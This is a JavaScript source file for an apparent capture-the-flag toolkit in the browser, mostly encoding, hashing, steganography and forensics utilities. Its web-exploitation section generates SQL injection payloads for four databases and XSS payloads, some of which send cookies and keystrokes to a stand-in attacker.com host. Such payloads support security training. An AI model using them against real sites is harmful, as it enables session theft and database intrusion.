// CTF Tools Platform - Fixed Implementation
class CTFTools {
    constructor() {
        this.init();
    }

    init() {
        this.setupNavigation();
        this.setupFileHandlers();
        this.showNotification('CyberLab CTF Tools loaded successfully', 'success');
    }

    setupNavigation() {
        const categoryItems = document.querySelectorAll('.category-item');
        categoryItems.forEach(item => {
            item.addEventListener('click', () => {
                const category = item.dataset.category;
                this.switchCategory(category);
            });
        });
    }

    switchCategory(category) {
        console.log('Switching to category:', category);
        
        // Update active category in sidebar
        document.querySelectorAll('.category-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`[data-category="${category}"]`);
        if (activeItem) {
            activeItem.classList.add('active');
        }

        // Update active section in main content
        document.querySelectorAll('.tool-section').forEach(section => {
            section.classList.remove('active');
        });
        const activeSection = document.getElementById(category);
        if (activeSection) {
            activeSection.classList.add('active');
            this.showNotification(`Switched to ${category.charAt(0).toUpperCase() + category.slice(1)} tools`, 'info');
        } else {
            console.error('Section not found:', category);
        }
    }

    setupFileHandlers() {
        // Set up file input handlers for various tools
        const fileInputs = document.querySelectorAll('input[type="file"]');
        fileInputs.forEach(input => {
            input.addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (file) {
                    this.handleFileUpload(file, input.id);
                }
            });
        });
    }

    handleFileUpload(file, inputId) {
        const reader = new FileReader();
        reader.onload = (e) => {
            const result = e.target.result;
            switch(inputId) {
                case 'hexFile':
                    this.displayHexData(result);
                    break;
                case 'stringsFile':
                    this.extractStringsFromFile(result);
                    break;
                case 'entropyFile':
                    this.calculateFileEntropy(result);
                    break;
                case 'binaryFile':
                    this.displayBinaryData(result);
                    break;
                case 'sigFile':
                    this.analyzeFileSignature(result);
                    break;
            }
        };
        
        if (inputId === 'hexFile' || inputId === 'stringsFile' || inputId === 'entropyFile' || inputId === 'binaryFile' || inputId === 'sigFile') {
            reader.readAsArrayBuffer(file);
        } else {
            reader.readAsText(file);
        }
    }

    // ======================
    // CRYPTOGRAPHY TOOLS
    // ======================

    processBase64() {
        console.log('Processing Base64...');
        const input = document.getElementById('base64Input');
        const operation = document.getElementById('base64Operation');
        const output = document.getElementById('base64Output');
        
        if (!input || !operation || !output) {
            console.error('Base64 elements not found');
            this.showNotification('Base64 tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const operationValue = operation.value;
        
        if (!inputValue) {
            this.showNotification('Please enter text to process', 'warning');
            return;
        }
        
        try {
            let result;
            if (operationValue === 'encode') {
                result = btoa(unescape(encodeURIComponent(inputValue)));
            } else {
                result = decodeURIComponent(escape(atob(inputValue)));
            }
            output.value = result;
            this.showNotification(`Base64 ${operationValue} successful`, 'success');
        } catch (error) {
            console.error('Base64 error:', error);
            output.value = `Error: Invalid input for ${operationValue}`;
            this.showNotification(`Invalid input for ${operationValue}`, 'error');
        }
    }

    processCaesar() {
        console.log('Processing Caesar cipher...');
        const input = document.getElementById('caesarInput');
        const shift = document.getElementById('caesarShift');
        const operation = document.getElementById('caesarOperation');
        const output = document.getElementById('caesarOutput');
        
        if (!input || !shift || !operation || !output) {
            console.error('Caesar elements not found');
            this.showNotification('Caesar tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const shiftValue = shift.value;
        const operationValue = operation.value;
        
        if (!inputValue) {
            this.showNotification('Please enter text', 'warning');
            return;
        }
        
        let result = '';
        
        if (operationValue === 'analyze' || !shiftValue) {
            result = 'Caesar Cipher Analysis (All Shifts):\n\n';
            for (let i = 1; i <= 25; i++) {
                const decoded = this.caesarShift(inputValue, i);
                result += `Shift ${i.toString().padStart(2, ' ')}: ${decoded}\n`;
            }
        } else {
            const shiftNum = parseInt(shiftValue);
            if (operationValue === 'encrypt') {
                result = this.caesarShift(inputValue, shiftNum);
            } else {
                result = this.caesarShift(inputValue, -shiftNum);
            }
        }
        
        output.value = result;
        this.showNotification('Caesar cipher processing complete', 'success');
    }

    caesarShift(text, shift) {
        return text.replace(/[A-Za-z]/g, (char) => {
            const start = char <= 'Z' ? 65 : 97;
            return String.fromCharCode(((char.charCodeAt(0) - start + shift + 26) % 26) + start);
        });
    }

    async generateHash() {
        console.log('Generating hash...');
        const input = document.getElementById('hashInput');
        const hashType = document.getElementById('hashType');
        const output = document.getElementById('hashOutput');
        
        if (!input || !hashType || !output) {
            console.error('Hash elements not found');
            this.showNotification('Hash tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const hashTypeValue = hashType.value;
        
        if (!inputValue) {
            this.showNotification('Please enter text to hash', 'warning');
            return;
        }
        
        try {
            const encoder = new TextEncoder();
            const data = encoder.encode(inputValue);
            const hashBuffer = await crypto.subtle.digest(hashTypeValue, data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            
            output.value = hashHex;
            this.showNotification(`${hashTypeValue} hash generated successfully`, 'success');
        } catch (error) {
            console.error('Hash generation error:', error);
            output.value = 'Error generating hash';
            this.showNotification('Error generating hash', 'error');
        }
    }

    processXOR() {
        console.log('Processing XOR...');
        const input = document.getElementById('xorInput');
        const key = document.getElementById('xorKey');
        const inputFormat = document.getElementById('xorInputFormat');
        const output = document.getElementById('xorOutput');
        
        if (!input || !key || !inputFormat || !output) {
            console.error('XOR elements not found');
            this.showNotification('XOR tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const keyValue = key.value.trim();
        const inputFormatValue = inputFormat.value;
        
        if (!inputValue || !keyValue) {
            this.showNotification('Please enter both input and key', 'warning');
            return;
        }
        
        try {
            let inputBytes;
            if (inputFormatValue === 'hex') {
                inputBytes = this.hexToBytes(inputValue);
            } else {
                inputBytes = new TextEncoder().encode(inputValue);
            }
            
            const keyBytes = new TextEncoder().encode(keyValue);
            const result = new Uint8Array(inputBytes.length);
            
            for (let i = 0; i < inputBytes.length; i++) {
                result[i] = inputBytes[i] ^ keyBytes[i % keyBytes.length];
            }
            
            // Try to decode as text, fallback to hex
            try {
                const decoded = new TextDecoder().decode(result);
                output.value = decoded;
            } catch {
                output.value = Array.from(result).map(b => b.toString(16).padStart(2, '0')).join(' ');
            }
            
            this.showNotification('XOR processing complete', 'success');
        } catch (error) {
            console.error('XOR error:', error);
            output.value = 'Error: Invalid input format';
            this.showNotification('Invalid input format', 'error');
        }
    }

    convertData() {
        console.log('Converting data...');
        const input = document.getElementById('converterInput');
        const from = document.getElementById('converterFrom');
        const to = document.getElementById('converterTo');
        const output = document.getElementById('converterOutput');
        
        if (!input || !from || !to || !output) {
            console.error('Converter elements not found');
            this.showNotification('Converter tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const fromValue = from.value;
        const toValue = to.value;
        
        if (!inputValue) {
            this.showNotification('Please enter data to convert', 'warning');
            return;
        }
        
        try {
            let intermediate = inputValue;
            
            // Convert from source format to bytes
            switch (fromValue) {
                case 'ascii':
                    intermediate = inputValue;
                    break;
                case 'hex':
                    const hexBytes = this.hexToBytes(inputValue);
                    intermediate = new TextDecoder().decode(hexBytes);
                    break;
                case 'binary':
                    const binaryBytes = this.binaryToBytes(inputValue);
                    intermediate = new TextDecoder().decode(binaryBytes);
                    break;
            }
            
            // Convert to target format
            let result;
            switch (toValue) {
                case 'ascii':
                    result = intermediate;
                    break;
                case 'hex':
                    result = Array.from(new TextEncoder().encode(intermediate))
                        .map(b => b.toString(16).padStart(2, '0'))
                        .join(' ');
                    break;
                case 'binary':
                    result = Array.from(new TextEncoder().encode(intermediate))
                        .map(b => b.toString(2).padStart(8, '0'))
                        .join(' ');
                    break;
            }
            
            output.value = result;
            this.showNotification(`Converted from ${fromValue} to ${toValue}`, 'success');
        } catch (error) {
            console.error('Conversion error:', error);
            output.value = 'Error: Invalid input format';
            this.showNotification('Invalid input format', 'error');
        }
    }

    translateMorse() {
        console.log('Translating Morse code...');
        const input = document.getElementById('morseInput');
        const output = document.getElementById('morseOutput');
        
        if (!input || !output) {
            console.error('Morse elements not found');
            this.showNotification('Morse tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        
        if (!inputValue) {
            this.showNotification('Please enter text or morse code', 'warning');
            return;
        }
        
        const morseCode = {
            'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
            'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
            'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
            'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
            'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
            '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
            '8': '---..', '9': '----.', ' ': '/'
        };
        
        const reverseMorse = Object.fromEntries(Object.entries(morseCode).map(([k, v]) => [v, k]));
        
        try {
            let result;
            if (inputValue.includes('.') || inputValue.includes('-')) {
                // Morse to text
                result = inputValue.split(/\s+/).map(code => reverseMorse[code] || '?').join('');
            } else {
                // Text to morse
                result = inputValue.toUpperCase().split('').map(char => morseCode[char] || '?').join(' ');
            }
            
            output.value = result;
            this.showNotification('Morse code translation complete', 'success');
        } catch (error) {
            console.error('Morse translation error:', error);
            output.value = 'Error translating morse code';
            this.showNotification('Error translating morse code', 'error');
        }
    }

    // ======================
    // WEB EXPLOITATION TOOLS
    // ======================

    decodeJWT() {
        console.log('Decoding JWT...');
        const token = document.getElementById('jwtToken');
        const header = document.getElementById('jwtHeader');
        const payload = document.getElementById('jwtPayload');
        const signature = document.getElementById('jwtSignature');
        
        if (!token || !header || !payload || !signature) {
            console.error('JWT elements not found');
            this.showNotification('JWT tool elements not found', 'error');
            return;
        }
        
        const tokenValue = token.value.trim();
        
        if (!tokenValue) {
            this.showNotification('Please enter a JWT token', 'warning');
            return;
        }
        
        try {
            const parts = tokenValue.split('.');
            if (parts.length !== 3) {
                throw new Error('Invalid JWT format');
            }
            
            const decodedHeader = JSON.parse(atob(parts[0]));
            const decodedPayload = JSON.parse(atob(parts[1]));
            
            header.value = JSON.stringify(decodedHeader, null, 2);
            payload.value = JSON.stringify(decodedPayload, null, 2);
            signature.value = parts[2];
            
            this.showNotification('JWT decoded successfully', 'success');
        } catch (error) {
            console.error('JWT decode error:', error);
            header.value = 'Error: Invalid JWT token';
            payload.value = 'Error: Invalid JWT token';
            signature.value = 'Error: Invalid JWT token';
            this.showNotification('Invalid JWT token', 'error');
        }
    }

    processURL() {
        console.log('Processing URL...');
        const input = document.getElementById('urlInput');
        const operation = document.getElementById('urlOperation');
        const output = document.getElementById('urlOutput');
        
        if (!input || !operation || !output) {
            console.error('URL elements not found');
            this.showNotification('URL tool elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const operationValue = operation.value;
        
        if (!inputValue) {
            this.showNotification('Please enter URL or text', 'warning');
            return;
        }
        
        try {
            let result;
            if (operationValue === 'encode') {
                result = encodeURIComponent(inputValue);
            } else {
                result = decodeURIComponent(inputValue);
            }
            output.value = result;
            this.showNotification(`URL ${operationValue} successful`, 'success');
        } catch (error) {
            console.error('URL processing error:', error);
            output.value = `Error: Invalid input for ${operationValue}`;
            this.showNotification(`Invalid input for ${operationValue}`, 'error');
        }
    }

    generateSQLPayloads() {
        console.log('Generating SQL payloads...');
        const database = document.getElementById('sqlDatabase');
        const attackType = document.getElementById('sqlAttackType');
        const output = document.getElementById('sqlPayloads');
        
        if (!database || !attackType || !output) {
            console.error('SQL elements not found');
            this.showNotification('SQL tool elements not found', 'error');
            return;
        }
        
        const databaseValue = database.value;
        const attackTypeValue = attackType.value;
        
        const payloads = {
            mysql: {
                union: [
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT user(),database(),version()--",
                    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
                    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
                ],
                boolean: [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND (SELECT LENGTH(database()))>5--",
                    "' AND (SELECT SUBSTRING(user(),1,1))='r'--"
                ],
                time: [
                    "' AND SLEEP(5)--",
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND (SELECT SLEEP(5) FROM users LIMIT 1)--",
                    "' AND IF(1=1,SLEEP(5),0)--"
                ],
                error: [
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
                    "' AND extractvalue(1,concat(0x7e,database(),0x7e))--"
                ]
            },
            postgresql: {
                union: [
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT user,current_database(),version()--",
                    "' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables--"
                ],
                boolean: [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                    "' AND (SELECT LENGTH(current_database()))>5--"
                ],
                time: [
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT pg_sleep(5))--",
                    "' AND (SELECT COUNT(*) FROM pg_sleep(5))--"
                ],
                error: [
                    "' AND (SELECT * FROM generate_series(1,1000))--",
                    "' AND (SELECT CAST(user AS int))--"
                ]
            },
            mssql: {
                union: [
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT user_name(),db_name(),@@version--"
                ],
                boolean: [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM sys.tables)>0--"
                ],
                time: [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND (SELECT WAITFOR DELAY '00:00:05')--"
                ],
                error: [
                    "' AND (SELECT * FROM (SELECT COUNT(*),name FROM sys.tables GROUP BY name HAVING COUNT(*)>1) t)--"
                ]
            },
            oracle: {
                union: [
                    "' UNION SELECT 1,2,3 FROM dual--",
                    "' UNION SELECT NULL,NULL,NULL FROM dual--",
                    "' UNION SELECT user,banner,null FROM v$version--"
                ],
                boolean: [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM all_tables)>0--"
                ],
                time: [
                    "' AND (SELECT COUNT(*) FROM all_objects,all_objects)>0--",
                    "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual)--"
                ],
                error: [
                    "' AND (SELECT * FROM (SELECT COUNT(*),CHR(124)||user||CHR(124) FROM dual GROUP BY CHR(124)||user||CHR(124)) WHERE ROWNUM<=1)--"
                ]
            }
        };
        
        const dbPayloads = payloads[databaseValue] || payloads.mysql;
        const selectedPayloads = dbPayloads[attackTypeValue] || dbPayloads.union;
        
        output.value = selectedPayloads.join('\n\n');
        this.showNotification(`Generated ${selectedPayloads.length} SQL payloads`, 'success');
    }

    generateXSSPayloads() {
        console.log('Generating XSS payloads...');
        const context = document.getElementById('xssContext');
        const payloadType = document.getElementById('xssPayloadType');
        const output = document.getElementById('xssPayloads');
        
        if (!context || !payloadType || !output) {
            console.error('XSS elements not found');
            this.showNotification('XSS tool elements not found', 'error');
            return;
        }
        
        const contextValue = context.value;
        const payloadTypeValue = payloadType.value;
        
        const payloads = {
            html: {
                alert: [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')">',
                    '<body onload=alert("XSS")>'
                ],
                cookie: [
                    '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
                    '<img src=x onerror=\'fetch("http://attacker.com/steal.php?cookie="+document.cookie)\'>',
                    '<svg onload=\'new Image().src="http://attacker.com/steal.php?cookie="+document.cookie\'>'
                ],
                redirect: [
                    '<script>window.location="http://attacker.com"</script>',
                    '<meta http-equiv="refresh" content="0;url=http://attacker.com">',
                    '<iframe src="http://attacker.com">'
                ],
                keylogger: [
                    '<script>document.addEventListener("keypress",function(e){fetch("http://attacker.com/log.php?key="+e.key)})</script>',
                    '<input type="text" onkeypress=\'fetch("http://attacker.com/log.php?key="+event.key)\'>'
                ]
            },
            attribute: {
                alert: [
                    '" onmouseover=alert("XSS") "',
                    '" onclick=alert("XSS") "',
                    '" onfocus=alert("XSS") "',
                    '" onload=alert("XSS") "'
                ],
                cookie: [
                    '" onmouseover=fetch("http://attacker.com/steal.php?cookie="+document.cookie) "',
                    '" onclick=new Image().src="http://attacker.com/steal.php?cookie="+document.cookie "'
                ],
                redirect: [
                    '" onmouseover=window.location="http://attacker.com" "',
                    '" onclick=document.location="http://attacker.com" "'
                ],
                keylogger: [
                    '" onkeypress=fetch("http://attacker.com/log.php?key="+event.key) "'
                ]
            },
            javascript: {
                alert: [
                    'alert("XSS")',
                    'eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))',
                    'setTimeout(alert("XSS"),1000)',
                    'setInterval(alert("XSS"),1000)'
                ],
                cookie: [
                    'fetch("http://attacker.com/steal.php?cookie="+document.cookie)',
                    'new Image().src="http://attacker.com/steal.php?cookie="+document.cookie'
                ],
                redirect: [
                    'window.location="http://attacker.com"',
                    'document.location="http://attacker.com"'
                ],
                keylogger: [
                    'document.addEventListener("keypress",function(e){fetch("http://attacker.com/log.php?key="+e.key)})'
                ]
            },
            css: {
                alert: [
                    'expression(alert("XSS"))',
                    'behavior:url(xss.htc)',
                    'background:url(javascript:alert("XSS"))'
                ],
                cookie: [
                    'expression(fetch("http://attacker.com/steal.php?cookie="+document.cookie))'
                ],
                redirect: [
                    'expression(window.location="http://attacker.com")'
                ],
                keylogger: [
                    'expression(document.addEventListener("keypress",function(e){fetch("http://attacker.com/log.php?key="+e.key)}))'
                ]
            }
        };
        
        const contextPayloads = payloads[contextValue] || payloads.html;
        const selectedPayloads = contextPayloads[payloadTypeValue] || contextPayloads.alert;
        
        output.value = selectedPayloads.join('\n\n');
        this.showNotification(`Generated ${selectedPayloads.length} XSS payloads`, 'success');
    }

    // ======================
    // STEGANOGRAPHY TOOLS
    // ======================

    hideTextMessage() {
        console.log('Hiding text message...');
        const coverText = document.getElementById('stegoText');
        const message = document.getElementById('stegoMessage');
        const method = document.getElementById('stegoMethod');
        const output = document.getElementById('stegoResult');
        
        if (!coverText || !message || !method || !output) {
            console.error('Steganography elements not found');
            this.showNotification('Steganography tool elements not found', 'error');
            return;
        }
        
        const coverTextValue = coverText.value;
        const messageValue = message.value;
        const methodValue = method.value;
        
        if (!coverTextValue || !messageValue) {
            this.showNotification('Please enter both cover text and message', 'warning');
            return;
        }
        
        try {
            let result;
            if (methodValue === 'zerowidth') {
                result = this.hideWithZeroWidth(coverTextValue, messageValue);
            } else {
                result = this.hideWithSpaces(coverTextValue, messageValue);
            }
            
            output.value = result;
            this.showNotification('Message hidden successfully', 'success');
        } catch (error) {
            console.error('Steganography error:', error);
            output.value = 'Error hiding message';
            this.showNotification('Error hiding message', 'error');
        }
    }

    extractTextMessage() {
        console.log('Extracting text message...');
        const stegoText = document.getElementById('stegoText');
        const method = document.getElementById('stegoMethod');
        const output = document.getElementById('stegoResult');
        
        if (!stegoText || !method || !output) {
            console.error('Steganography elements not found');
            this.showNotification('Steganography tool elements not found', 'error');
            return;
        }
        
        const stegoTextValue = stegoText.value;
        const methodValue = method.value;
        
        if (!stegoTextValue) {
            this.showNotification('Please enter text to extract from', 'warning');
            return;
        }
        
        try {
            let result;
            if (methodValue === 'zerowidth') {
                result = this.extractFromZeroWidth(stegoTextValue);
            } else {
                result = this.extractFromSpaces(stegoTextValue);
            }
            
            output.value = result || 'No hidden message found';
            this.showNotification('Extraction complete', 'success');
        } catch (error) {
            console.error('Extraction error:', error);
            output.value = 'Error extracting message';
            this.showNotification('Error extracting message', 'error');
        }
    }

    hideWithZeroWidth(coverText, message) {
        const zeroWidthChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
        const binaryMessage = message.split('').map(char => 
            char.charCodeAt(0).toString(2).padStart(8, '0')
        ).join('');
        
        let result = '';
        let binaryIndex = 0;
        
        for (let i = 0; i < coverText.length && binaryIndex < binaryMessage.length; i++) {
            result += coverText[i];
            if (coverText[i] === ' ') {
                const bit = binaryMessage[binaryIndex];
                if (bit === '1') {
                    result += zeroWidthChars[0];
                }
                binaryIndex++;
            }
        }
        
        return result + coverText.slice(result.length - (binaryIndex < binaryMessage.length ? 0 : 1));
    }

    extractFromZeroWidth(text) {
        const zeroWidthChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
        let binaryMessage = '';
        
        for (let i = 0; i < text.length; i++) {
            if (text[i] === ' ') {
                const nextChar = text[i + 1];
                if (zeroWidthChars.includes(nextChar)) {
                    binaryMessage += '1';
                } else {
                    binaryMessage += '0';
                }
            }
        }
        
        // Convert binary to text
        let result = '';
        for (let i = 0; i < binaryMessage.length; i += 8) {
            const byte = binaryMessage.substr(i, 8);
            if (byte.length === 8) {
                result += String.fromCharCode(parseInt(byte, 2));
            }
        }
        
        return result;
    }

    hideWithSpaces(coverText, message) {
        // Use different space characters to encode binary
        const normalSpace = ' ';
        const wideSpace = '\u2000';
        
        const binaryMessage = message.split('').map(char => 
            char.charCodeAt(0).toString(2).padStart(8, '0')
        ).join('');
        
        let result = '';
        let binaryIndex = 0;
        
        for (let i = 0; i < coverText.length && binaryIndex < binaryMessage.length; i++) {
            if (coverText[i] === ' ') {
                const bit = binaryMessage[binaryIndex];
                result += bit === '1' ? wideSpace : normalSpace;
                binaryIndex++;
            } else {
                result += coverText[i];
            }
        }
        
        return result + coverText.slice(result.length);
    }

    extractFromSpaces(text) {
        const normalSpace = ' ';
        const wideSpace = '\u2000';
        let binaryMessage = '';
        
        for (let i = 0; i < text.length; i++) {
            if (text[i] === wideSpace) {
                binaryMessage += '1';
            } else if (text[i] === normalSpace) {
                binaryMessage += '0';
            }
        }
        
        // Convert binary to text
        let result = '';
        for (let i = 0; i < binaryMessage.length; i += 8) {
            const byte = binaryMessage.substr(i, 8);
            if (byte.length === 8) {
                result += String.fromCharCode(parseInt(byte, 2));
            }
        }
        
        return result;
    }

    analyzeSignature() {
        console.log('Analyzing signature...');
        const hexInput = document.getElementById('sigHex');
        const output = document.getElementById('sigResult');
        
        if (!hexInput || !output) {
            console.error('Signature elements not found');
            this.showNotification('Signature tool elements not found', 'error');
            return;
        }
        
        const hexInputValue = hexInput.value.trim();
        
        if (!hexInputValue) {
            this.showNotification('Please enter hex signature or upload a file', 'warning');
            return;
        }
        
        const signatures = {
            'FFD8FF': 'JPEG Image',
            '89504E47': 'PNG Image',
            '47494638': 'GIF Image',
            '424D': 'BMP Image',
            '504B0304': 'ZIP Archive',
            '504B0506': 'ZIP Archive (empty)',
            '504B0708': 'ZIP Archive (spanned)',
            '52617221': 'RAR Archive',
            '377ABCAF271C': '7-Zip Archive',
            '1F8B08': 'GZIP Archive',
            '425A68': 'BZIP2 Archive',
            '7573746172': 'TAR Archive',
            '4D5A': 'Windows Executable (PE)',
            '7F454C46': 'Linux Executable (ELF)',
            'CAFEBABE': 'Java Class File',
            'D0CF11E0': 'Microsoft Office Document',
            '25504446': 'PDF Document',
            '3C3F786D6C': 'XML Document',
            '3C68746D6C': 'HTML Document',
            '49545346': 'CHM Help File',
            '4D544864': 'MIDI Audio',
            '494433': 'MP3 Audio',
            '667479704D534E56': 'MP4 Video',
            '000001BA': 'MPEG Video',
            '000001B3': 'MPEG Video',
            '464C56': 'Flash Video (FLV)',
            '52494646': 'WAV Audio / AVI Video'
        };
        
        const cleanHex = hexInputValue.replace(/[^0-9A-Fa-f]/g, '').toUpperCase();
        let result = `Analyzing signature: ${cleanHex}\n\n`;
        
        let found = false;
        for (const [sig, desc] of Object.entries(signatures)) {
            if (cleanHex.startsWith(sig)) {
                result += `✓ MATCH FOUND: ${desc}\n`;
                result += `  Signature: ${sig}\n`;
                result += `  Confidence: High\n\n`;
                found = true;
                break;
            }
        }
        
        if (!found) {
            result += `✗ No known signature match found\n\n`;
        }
        
        result += `Additional Analysis:\n`;
        result += `- Hex Length: ${cleanHex.length} characters (${cleanHex.length/2} bytes)\n`;
        result += `- First 16 bytes: ${cleanHex.substring(0, 32)}\n`;
        
        if (cleanHex.length >= 8) {
            const possibleText = this.hexToText(cleanHex.substring(0, 16));
            result += `- As ASCII: ${possibleText}\n`;
        }
        
        output.value = result;
        this.showNotification('File signature analysis complete', 'success');
    }

    analyzeFileSignature(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        const hex = Array.from(bytes.slice(0, 32)).map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
        
        document.getElementById('sigHex').value = hex;
        this.analyzeSignature();
    }

    // ======================
    // FORENSICS TOOLS
    // ======================

    displayHexData(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        const hexData = document.getElementById('hexData');
        
        let result = '';
        for (let i = 0; i < bytes.length; i += 16) {
            const offset = i.toString(16).padStart(8, '0').toUpperCase();
            const hexLine = [];
            const asciiLine = [];
            
            for (let j = 0; j < 16; j++) {
                if (i + j < bytes.length) {
                    const byte = bytes[i + j];
                    hexLine.push(byte.toString(16).padStart(2, '0').toUpperCase());
                    asciiLine.push(byte >= 32 && byte <= 126 ? String.fromCharCode(byte) : '.');
                } else {
                    hexLine.push('  ');
                    asciiLine.push(' ');
                }
            }
            
            result += `${offset}  ${hexLine.slice(0, 8).join(' ')} ${hexLine.slice(8).join(' ')}  |${asciiLine.join('')}|\n`;
        }
        
        hexData.value = result;
        this.showNotification('Hex data loaded successfully', 'success');
    }

    loadHexFile() {
        const fileInput = document.getElementById('hexFile');
        if (!fileInput) {
            this.showNotification('Hex file input not found', 'error');
            return;
        }
        
        if (fileInput.files.length === 0) {
            this.showNotification('Please select a file', 'warning');
            return;
        }
        
        this.showNotification('Loading hex file...', 'info');
        // File handling is done in setupFileHandlers
    }

    searchHex() {
        console.log('Searching hex...');
        const searchTerm = document.getElementById('hexSearch');
        const hexData = document.getElementById('hexData');
        
        if (!searchTerm || !hexData) {
            console.error('Hex search elements not found');
            this.showNotification('Hex search elements not found', 'error');
            return;
        }
        
        const searchTermValue = searchTerm.value.trim();
        const hexDataValue = hexData.value;
        
        if (!searchTermValue) {
            this.showNotification('Please enter search term', 'warning');
            return;
        }
        
        if (!hexDataValue) {
            this.showNotification('Please load a file first', 'warning');
            return;
        }
        
        const lines = hexDataValue.split('\n');
        let found = false;
        let results = [];
        
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            if (line.includes(searchTermValue.toUpperCase()) || line.includes(searchTermValue)) {
                results.push(`Line ${i + 1}: ${line}`);
                found = true;
            }
        }
        
        if (found) {
            this.showNotification(`Found ${results.length} matches`, 'success');
            // Highlight results (simple implementation)
            const highlighted = hexDataValue.replace(new RegExp(searchTermValue.toUpperCase(), 'g'), `[${searchTermValue.toUpperCase()}]`);
            hexData.value = highlighted;
        } else {
            this.showNotification('No matches found', 'info');
        }
    }

    extractStrings() {
        console.log('Extracting strings...');
        const fileInput = document.getElementById('stringsFile');
        const textInput = document.getElementById('stringsText');
        const minLen = document.getElementById('stringsMinLen');
        const output = document.getElementById('stringsOutput');
        
        if (!fileInput || !textInput || !minLen || !output) {
            console.error('String extraction elements not found');
            this.showNotification('String extraction elements not found', 'error');
            return;
        }
        
        const textInputValue = textInput.value.trim();
        const minLenValue = parseInt(minLen.value) || 4;
        
        if (fileInput.files.length === 0 && !textInputValue) {
            this.showNotification('Please select a file or enter text', 'warning');
            return;
        }
        
        if (textInputValue) {
            this.extractStringsFromText(textInputValue, minLenValue);
        }
        // File handling is done in setupFileHandlers
    }

    extractStringsFromFile(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        const minLen = parseInt(document.getElementById('stringsMinLen').value) || 4;
        const output = document.getElementById('stringsOutput');
        
        let result = '';
        let currentString = '';
        let offset = 0;
        
        for (let i = 0; i < bytes.length; i++) {
            const byte = bytes[i];
            
            if (byte >= 32 && byte <= 126) {
                if (currentString.length === 0) {
                    offset = i;
                }
                currentString += String.fromCharCode(byte);
            } else {
                if (currentString.length >= minLen) {
                    result += `0x${offset.toString(16).padStart(8, '0')}: ${currentString}\n`;
                }
                currentString = '';
            }
        }
        
        if (currentString.length >= minLen) {
            result += `0x${offset.toString(16).padStart(8, '0')}: ${currentString}\n`;
        }
        
        output.value = result;
        this.showNotification('String extraction complete', 'success');
    }

    extractStringsFromText(text, minLen) {
        const output = document.getElementById('stringsOutput');
        const regex = new RegExp(`[\\x20-\\x7E]{${minLen},}`, 'g');
        const matches = text.match(regex) || [];
        
        let result = '';
        matches.forEach((match, index) => {
            result += `String ${index + 1}: ${match}\n`;
        });
        
        output.value = result;
        this.showNotification(`Found ${matches.length} strings`, 'success');
    }

    // ======================
    // BINARY ANALYSIS TOOLS
    // ======================

    calculateEntropy() {
        console.log('Calculating entropy...');
        const fileInput = document.getElementById('entropyFile');
        const textInput = document.getElementById('entropyText');
        
        if (!fileInput || !textInput) {
            console.error('Entropy elements not found');
            this.showNotification('Entropy elements not found', 'error');
            return;
        }
        
        const textInputValue = textInput.value.trim();
        
        if (fileInput.files.length === 0 && !textInputValue) {
            this.showNotification('Please select a file or enter text', 'warning');
            return;
        }
        
        if (textInputValue) {
            this.calculateTextEntropy(textInputValue);
        }
        // File handling is done in setupFileHandlers
    }

    calculateFileEntropy(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        const entropy = this.calculateEntropyFromBytes(bytes);
        const output = document.getElementById('entropyResult');
        
        let result = `Entropy Analysis Results:\n\n`;
